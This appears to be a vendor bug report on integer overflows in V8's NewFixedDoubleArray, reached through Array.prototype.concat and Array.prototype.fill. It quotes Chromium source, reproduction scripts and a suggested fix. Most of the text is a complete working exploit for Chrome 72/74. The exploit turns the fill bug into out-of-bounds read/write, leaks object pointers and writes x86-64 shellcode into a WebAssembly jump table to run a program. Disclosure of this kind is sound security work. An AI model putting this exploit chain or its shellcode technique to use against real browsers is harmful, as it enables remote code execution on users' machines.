@@ -1,0 +1,402 @@
+VULNERABILITY DETAILS
+https://cs.chromium.org/chromium/src/v8/src/heap/factory.cc?rcl=dd689541d3815d64b4b39f6a41603248c71aa00e&l=496
+Handle<FixedArrayBase> Factory::NewFixedDoubleArray(int length,
+                                                    PretenureFlag pretenure) {
+  DCHECK_LE(0, length);
+  if (length == 0) return empty_fixed_array();
+  if (length > FixedDoubleArray::kMaxLength) { // ***1***
+    isolate()->heap()->FatalProcessOutOfMemory("invalid array length");
+  }
+  int size = FixedDoubleArray::SizeFor(length); // ***2***
+  Map map = *fixed_double_array_map();
+  HeapObject result =
+      AllocateRawWithImmortalMap(size, pretenure, map, kDoubleAligned);
+  Handle<FixedDoubleArray> array(FixedDoubleArray::cast(result), isolate());
+  array->set_length(length);
+  return array;
+}
+
+https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-array.cc?rcl=933508f981a984b7868d70c3adb781783e5aa32d&l=1183
+Object Slow_ArrayConcat(BuiltinArguments* args, Handle<Object> species,
+                        Isolate* isolate) {
+[...]
+  uint32_t estimate_result_length = 0;
+  uint32_t estimate_nof = 0;
+  FOR_WITH_HANDLE_SCOPE(isolate, int, i = 0, i, i < argument_count, i++, {
+    Handle<Object> obj = args->at(i);
+    uint32_t length_estimate;
+    uint32_t element_estimate;
+    if (obj->IsJSArray()) {
+      Handle<JSArray> array(Handle<JSArray>::cast(obj));
+      length_estimate = static_cast<uint32_t>(array->length()->Number());
+      if (length_estimate != 0) {
+        ElementsKind array_kind =
+            GetPackedElementsKind(array->GetElementsKind());
+        kind = GetMoreGeneralElementsKind(kind, array_kind);
+      }
+      element_estimate = EstimateElementCount(isolate, array);
+    } else {
+[...]
+    }
+    // Avoid overflows by capping at kMaxElementCount.
+    if (JSObject::kMaxElementCount - estimate_result_length < length_estimate) { // ***3***
+      estimate_result_length = JSObject::kMaxElementCount;
+    } else {
+      estimate_result_length += length_estimate;
+    }
+    if (JSObject::kMaxElementCount - estimate_nof < element_estimate) {
+      estimate_nof = JSObject::kMaxElementCount;
+    } else {
+      estimate_nof += element_estimate;
+    }
+  });
+
+  // If estimated number of elements is more than half of length, a
+  // fixed array (fast case) is more time and space-efficient than a
+  // dictionary.
+  bool fast_case = is_array_species &&
+                   (estimate_nof * 2) >= estimate_result_length &&
+                   isolate->IsIsConcatSpreadableLookupChainIntact(); // ***4***
+
+  if (fast_case && kind == PACKED_DOUBLE_ELEMENTS) {
+    Handle<FixedArrayBase> storage =
+        isolate->factory()->NewFixedDoubleArray(estimate_result_length); // ***5***
+[...]
+
+https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-array.cc?rcl=9ea32aab5b494eaaf27ced51a6608e8400a3c4e5&l=1378
+MaybeHandle<JSArray> Fast_ArrayConcat(Isolate* isolate,
+                                      BuiltinArguments* args) {
+[...]
+  int result_len = 0;
+  {
+    DisallowHeapAllocation no_gc;
+    // Iterate through all the arguments performing checks
+    // and calculating total length.
+    for (int i = 0; i < n_arguments; i++) {
+      Object arg = (*args)[i];
+      if (!arg->IsJSArray()) return MaybeHandle<JSArray>();
+      if (!HasOnlySimpleReceiverElements(isolate, JSObject::cast(arg))) {
+        return MaybeHandle<JSArray>();
+      }
+      // TODO(cbruni): support fast concatenation of DICTIONARY_ELEMENTS.
+      if (!JSObject::cast(arg)->HasFastElements()) {
+        return MaybeHandle<JSArray>();
+      }
+      Handle<JSArray> array(JSArray::cast(arg), isolate);
+      if (!IsSimpleArray(isolate, array)) { // ***6***
+        return MaybeHandle<JSArray>();
+      }
+      // The Array length is guaranted to be <= kHalfOfMaxInt thus we won't
+      // overflow.
+      result_len += Smi::ToInt(array->length());
+      DCHECK_GE(result_len, 0);
+      // Throw an Error if we overflow the FixedArray limits
+      if (FixedDoubleArray::kMaxLength < result_len || /// ***7***
+          FixedArray::kMaxLength < result_len) {
+        AllowHeapAllocation gc;
+        THROW_NEW_ERROR(isolate,
+                        NewRangeError(MessageTemplate::kInvalidArrayLength),
+                        JSArray);
+      }
+    }
+  }
+  return ElementsAccessor::Concat(isolate, args, n_arguments, result_len);
+}
+
+https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-array.cc?rcl=9ea32aab5b494eaaf27ced51a6608e8400a3c4e5&l=244
+BUILTIN(ArrayPrototypeFill) {
+[...]
+  // 2. Let len be ? ToLength(? Get(O, "length")).
+  double length;
+  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, length, GetLengthProperty(isolate, receiver)); // ***8***
+
+  // 3. Let relativeStart be ? ToInteger(start).
+  // 4. If relativeStart < 0, let k be max((len + relativeStart), 0);
+  //    else let k be min(relativeStart, len).
+  Handle<Object> start = args.atOrUndefined(isolate, 2);
+
+  double start_index;
+  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, start_index, GetRelativeIndex(isolate, length, start, 0)); // ***9***
+
+  // 5. If end is undefined, let relativeEnd be len;
+  //    else let relativeEnd be ? ToInteger(end).
+  // 6. If relativeEnd < 0, let final be max((len + relativeEnd), 0);
+  //    else let final be min(relativeEnd, len).
+  Handle<Object> end = args.atOrUndefined(isolate, 3);
+
+  double end_index;
+  MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, end_index, GetRelativeIndex(isolate, length, end, length));
+[...]
+  if (TryFastArrayFill(isolate, &args, receiver, value, start_index,
+                       end_index)) {
+
+https://cs.chromium.org/chromium/src/v8/src/elements.cc?rcl=d8b0d88de4b7d73ea02abb8511c146944d6ccf67&l=2244
+static Object FillImpl(Handle<JSObject> receiver, Handle<Object> obj_value,
+                       uint32_t start, uint32_t end) {
+  // Ensure indexes are within array bounds
+  DCHECK_LE(0, start);
+  DCHECK_LE(start, end);
+
+  // Make sure COW arrays are copied.
+  if (IsSmiOrObjectElementsKind(Subclass::kind())) {
+    JSObject::EnsureWritableFastElements(receiver);
+  }
+
+  // Make sure we have enough space.
+  uint32_t capacity =
+      Subclass::GetCapacityImpl(*receiver, receiver->elements());
+  if (end > capacity) {
+    Subclass::GrowCapacityAndConvertImpl(receiver, end); // ***10***
+    CHECK_EQ(Subclass::kind(), receiver->GetElementsKind());
+  }
+
+|NewFixedDoubleArray| doesn't expect the |length| argument to be negative (there's even a DCHECK for
+that), as it would pass the maximum length check[1] and cause an integer overflow when computing the
+size of the backing store[2]. The undersized backing store then might be used for out-of-bounds 
+access. It turns out there are at least two methods that allow passing negative values to
+|NewFixedDoubleArray|.
+
+
+1. Concat
+
+The implementation of |Array.prototype.concat| in V8 has quite a few fast code paths that deal with
+different kinds of arguments. The structure roughly looks like:
+
+                     +------------------+
+                     |                  |
+      +--------------> Fast_ArrayConcat |
+      |              |                  |
+      |              +------------------+      ***********************
++-------------+                                *                     *
+|             |               +----------------> packed double array *
+| ArrayConcat |               |                *                     *
+|             |               |                ***********************
++-------------+               |
+      |              +------------------+                                    +---------------------+
+      |              |                  |                                    |                     |
+      +--------------> Slow_ArrayConcat |                 +------------------> fixed array storage |
+                     |                  |                 |                  |                     |
+                     +------------------+                 |                  +---------------------+
+                              |                           |
+                              |                +---------------------+       +---------------------+
+                              |                |                     |       |                     |
+                              +----------------> ArrayConcatVisitor  +-------> dictionary storage  |
+                                               |                     |       |                     |
+                                               +---------------------+       +---------------------+
+                                                          |
+                                                          |                  +---------------------+
+                                                          |                  |                     |
+                                                          +------------------> JSReceiver storage  |
+                                                                             |                     |
+                                                                             +---------------------+
+
+The relevant code path for this issue is the packed double array case inside |Slow_ArrayConcat|.
+The method uses an unsigned variable for computing the result array length and caps it at
+|kMaxElementCount|[3], i.e., at 0xffffffff. Then the value of the variable gets converted to a
+*signed* type and passed to |NewFixedDoubleArray|[5] provided that the |fast_case| condition is
+satisfied[4], and the estimated array type is PACKED_DOUBLE. Thus, any value in the range
+[0x80000000, 0xffffffff] could pass the length check and trigger the overflow.
+
+That still means an attacker has to make the method iterate through more than two billion array
+elements, which might seem implausible; actually, the whole process takes just a couple of seconds
+on a modern machine and has moderate memory requirements because multiple arguments can refer to the
+same array.
+
+Also, |ArrayConcat| calls |Fast_ArrayConcat| in the beginning, and the fast method has a more strict
+length check, which might throw an error when the result length is more than |FixedDoubleArray::
+kMaxLength|[7]. So, the attacker has to make |Fast_ArrayConcat| return early without triggering the
+error. The easiest way to achieve that is to define an additional property on the array.
+
+REPRODUCTION CASE:
+<script>
+const MB = 1024 * 1024,
+      block_size = 32 * MB;
+array = Array(block_size).fill(1.1);
+array.prop = 1;
+args = Array(2048 * MB / block_size - 2).fill(array);
+args.push(Array(block_size));
+array.concat.apply(array, args);
+</script>
+
+
+2. Fill
+
+The bug in |concat| allows writing data beyond the bounds of an array, but it's difficult to limit
+the size of the OOB data to a sane value, which makes the exploitation primitive less useful.
+So, I've spent some time looking for variants of the issue, and found one in |Array.prototype.fill|.
+
+|ArrayPrototypeFill| initially obtains the length of an array[8] and uses that value to limit the
+|start| and |end| arguments. However, a later call to |GetRelativeIndex|[9] might trigger a
+user-defined JS function, which could modify the length. Usually, that's enough to cause OOB
+access, so |FastElementsAccessor::FillImpl| double-checks that the capacity of the array is not less
+than |end| and might call |GrowCapacityAndConvertImpl|[10], which in turn might call
+|NewFixedDoubleArray|. The issue here is that there's no check that |end| is small enough to fit in
+a signed type; therefore the same overflow leading to the allocation of an undersized backing store
+could occur.
+
+REPRODUCTION CASE:
+<script>
+array = [];
+array.length = 0xffffffff;
+
+b = array.fill(1.1, 0, {valueOf() {
+  array.length = 32;
+  array.fill(1.1);
+  return 0x80000000;
+}});
+</script>
+
+
+Exploitation:
+Unlike |concat|, |fill| conveniently allows limiting the size of the OOB block by modifying the
+|start| argument. The exploit forces the method to return an array whose length value is bigger than
+the actual size of the backing store, which is essentially a ready-to-use OOB read/write
+exploitation primitive. The rest is just copied from https://crbug.com/931640.
+
+<script>
+let data_view = new DataView(new ArrayBuffer(8));
+reverseDword = dword => {
+  data_view.setUint32(0, dword, true);
+  return data_view.getUint32(0, false);
+}
+
+reverseQword = qword => {
+  data_view.setBigUint64(0, qword, true);
+  return data_view.getBigUint64(0, false);
+}
+
+floatAsQword = float => {
+  data_view.setFloat64(0, float);
+  return data_view.getBigUint64(0);
+}
+
+qwordAsFloat = qword => {
+  data_view.setBigUint64(0, qword);
+  return data_view.getFloat64(0);
+}
+
+let oob_access_array;
+let ptr_leak_object;
+let arbirary_access_array;
+let ptr_leak_index;
+let external_ptr_index;
+let external_ptr_backup;
+const MARKER = 0x31337;
+
+leakPtr = obj => {
+  ptr_leak_object[0] = obj;
+  return floatAsQword(oob_access_array[ptr_leak_index]);
+}
+
+getQword = address => {
+  oob_access_array[external_ptr_index] = qwordAsFloat(address);
+  return arbirary_access_array[0];
+  oob_access_array[external_ptr_index] = external_ptr_backup;
+}
+
+setQword = (address, value) => {
+  oob_access_array[external_ptr_index] = qwordAsFloat(address);
+  arbirary_access_array[0] = value;
+  oob_access_array[external_ptr_index] = external_ptr_backup;
+}
+
+getField = (object_ptr, num, tagged = true) =>
+  object_ptr + BigInt(num * 8 - (tagged ? 1 : 0));
+
+setBytes = (address, array) => {
+  for (let i = 0; i < array.length; ++i) {
+    setQword(address + BigInt(i), BigInt(array[i]));
+  }
+}
+
+triggerOob = () => {
+  array = [];
+  array.length = 0xffffffff;
+  ptr_leak_object = {};
+  arbirary_access_array = new BigUint64Array(1);
+
+  oob_access_array = array.fill(1.1, 0x80000000 - 1, {valueOf() {
+    array.length = 32;
+    array.fill(1.1);
+    return 0x80000000;
+  }});
+  ptr_leak_object[0] = MARKER;
+  arbirary_access_array.buffer;
+}
+
+findOffsets = () => {
+  let markerAsFloat = qwordAsFloat(BigInt(MARKER) << 32n);
+  for (ptr_leak_index = 0; ptr_leak_index < oob_access_array.length;
+      ++ptr_leak_index) {
+    if (oob_access_array[ptr_leak_index] === markerAsFloat) {
+      break;
+    }
+  }
+
+  let oneAsFloat = qwordAsFloat(1n << 32n);
+  for (external_ptr_index = 2; external_ptr_index < oob_access_array.length;
+      ++external_ptr_index) {
+    if (oob_access_array[external_ptr_index - 2] === oneAsFloat &&
+        oob_access_array[external_ptr_index - 1] === 0) {
+      break;
+    }
+  }
+
+  if (ptr_leak_index === oob_access_array.length ||
+      external_ptr_index === oob_access_array.length) {
+    throw alert("Couldn't locate the offsets");
+  }
+
+  external_ptr_backup = oob_access_array[external_ptr_index];
+}
+
+runCalc = () => {
+  const wasm_code = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
+    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
+    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
+    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
+    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
+    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
+    0x00, 0x00, 0x41, 0x00, 0x0b
+  ]);
+  const wasm_instance = new WebAssembly.Instance(
+    new WebAssembly.Module(wasm_code));
+  const wasm_func = wasm_instance.exports.a;
+
+  const shellcode = [
+    0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,
+    0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,
+    0x48, 0x8d, 0x3d, 0x0c, 0x00, 0x00, 0x00, 0x57,
+    0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00, 0x00,
+    0x0f, 0x05, 0xcc, 0x2f, 0x75, 0x73, 0x72, 0x2f,
+    0x62, 0x69, 0x6e, 0x2f, 0x67, 0x6e, 0x6f, 0x6d,
+    0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c,
+    0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,
+    0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00
+  ];
+
+  wasm_instance_ptr = leakPtr(wasm_instance);
+  const jump_table = getQword(getField(wasm_instance_ptr, 33));
+
+  setBytes(jump_table, shellcode);
+  wasm_func();
+}
+
+triggerOob();
+findOffsets();
+runCalc();
+</script>
+
+
+VERSION
+Google Chrome 72.0.3626.121 (Official Build) (64-bit)
+Google Chrome 74.0.3725.0 (Official Build) canary
+
+
+I'd recommend changing |NewFixedDoubleArray| so it throws an OOM error on negative values, the same
+way as the similar |AllocateRawFixedArray| function currently does.
